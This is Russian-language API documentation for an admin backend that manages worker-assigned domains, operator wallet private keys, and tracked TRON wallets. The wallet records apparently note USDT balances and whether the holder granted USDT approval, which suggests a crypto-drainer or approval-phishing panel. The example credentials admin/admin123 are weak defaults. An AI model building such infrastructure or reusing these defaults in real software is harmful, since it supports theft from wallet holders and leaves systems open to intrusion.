# Admin API Documentation

## Авторизация

### 1. Вход в систему
```bash
POST /admin/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}
```

**Ответ:**
```json
{
  "success": true,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "admin": {
      "id": 1,
      "username": "admin",
      "last_login": "2025-07-18T12:00:00.000Z"
    }
  },
  "message": "Login successful"
}
```

### 2. Получить профиль
```bash
GET /admin/auth/profile
Authorization: Bearer YOUR_JWT_TOKEN
```

### 3. Изменить пароль
```bash
POST /admin/auth/change-password
Authorization: Bearer YOUR_JWT_TOKEN
Content-Type: application/json

{
  "oldPassword": "admin123",
  "newPassword": "newSecurePassword123"
}
```

### 4. Создать нового администратора
```bash
POST /admin/auth/create-admin
Authorization: Bearer YOUR_JWT_TOKEN
Content-Type: application/json

{
  "username": "admin2",
  "password": "securePassword123"
}
```

## Domains API

### 1. Получить все домены
```bash
GET /admin/domains?page=1&limit=10&sortBy=created_at&sortOrder=desc
Authorization: Bearer YOUR_JWT_TOKEN
```

### 2. Получить домен по ID
```bash
GET /admin/domains/1
Authorization: Bearer YOUR_JWT_TOKEN
```

### 3. Создать домен
```bash
POST /admin/domains
Authorization: Bearer YOUR_JWT_TOKEN
Content-Type: application/json

{
  "worker_id": "worker123",
  "worker_nickname": "Worker 1",
  "domain": "example.com",
  "chats": "[{\"id\": 1, \"name\": \"Chat 1\"}]",
  "metadata": "{\"key\": \"value\"}",
  "operator_wallet_address": "TRX_ADDRESS",
  "operator_wallet_privateKey": "PRIVATE_KEY",
  "only_contract": true,
  "minimal_asset_amount": 10
}
```

### 4. Обновить домен
```bash
PUT /admin/domains/1
Authorization: Bearer YOUR_JWT_TOKEN
Content-Type: application/json

{
  "domain": "newdomain.com",
  "minimal_asset_amount": 20
}
```

### 5. Удалить домен
```bash
DELETE /admin/domains/1
Authorization: Bearer YOUR_JWT_TOKEN
```

## Wallets API

### 1. Получить все кошельки
```bash
GET /admin/wallets?page=1&limit=10&sortBy=created_at&sortOrder=desc
Authorization: Bearer YOUR_JWT_TOKEN
```

### 2. Получить статистику кошельков
```bash
GET /admin/wallets/stats
Authorization: Bearer YOUR_JWT_TOKEN
```

### 3. Получить кошелек по ID
```bash
GET /admin/wallets/1
Authorization: Bearer YOUR_JWT_TOKEN
```

### 4. Получить кошелек по адресу
```bash
GET /admin/wallets/address/TRX_ADDRESS
Authorization: Bearer YOUR_JWT_TOKEN
```

### 5. Обновить кошелек
```bash
PUT /admin/wallets/1
Authorization: Bearer YOUR_JWT_TOKEN
Content-Type: application/json

{
  "trxBalance": 100.5,
  "usdtBalance": 50.0,
  "has_usdt_approval": true
}
```

### 6. Удалить кошелек
```bash
DELETE /admin/wallets/1
Authorization: Bearer YOUR_JWT_TOKEN
```

## Checks API

### 1. Получить все чеки
```bash
GET /admin/checks?page=1&limit=10&status=active
Authorization: Bearer YOUR_JWT_TOKEN
```

### 2. Получить статистику чеков
```bash
GET /admin/checks/stats
Authorization: Bearer YOUR_JWT_TOKEN
```

### 3. Получить чек по ID
```bash
GET /admin/checks/1
Authorization: Bearer YOUR_JWT_TOKEN
```

### 4. Обновить чек
```bash
PUT /admin/checks/1
Authorization: Bearer YOUR_JWT_TOKEN
Content-Type: application/json

{
  "status": "completed",
  "timer_end": "2025-07-18T15:00:00.000Z"
}
```

### 5. Удалить чек
```bash
DELETE /admin/checks/1
Authorization: Bearer YOUR_JWT_TOKEN
```

## Установка и запуск

1. Создайте первого администратора:
```bash
npm run create-admin
```

2. Запустите сервер:
```bash
npm start
```

3. Сервер будет доступен по адресу: `http://localhost:3000`

## Переменные окружения

Создайте файл `.env` в корне проекта:

```env
DATABASE_URL="file:./dev.db"
JWT_SECRET="your-super-secret-jwt-key-change-this-in-production"
JWT_EXPIRES_IN="24h"
```

## Структура ответов API

Все ответы имеют единообразную структуру:

```json
{
  "success": boolean,
  "data": any,
  "message": string,
  "error": string
}
```

## Пагинация

Для списков данных используется пагинация:

```json
{
  "success": true,
  "data": {
    "data": [...],
    "pagination": {
      "page": 1,
      "limit": 10,
      "total": 100,
      "totalPages": 10
    }
  }
}
```

## Коды ошибок

- `200` - Успешный запрос
- `201` - Ресурс создан
- `400` - Неверные данные запроса
- `401` - Не авторизован
- `403` - Доступ запрещен
- `404` - Ресурс не найден
- `500` - Внутренняя ошибка сервера
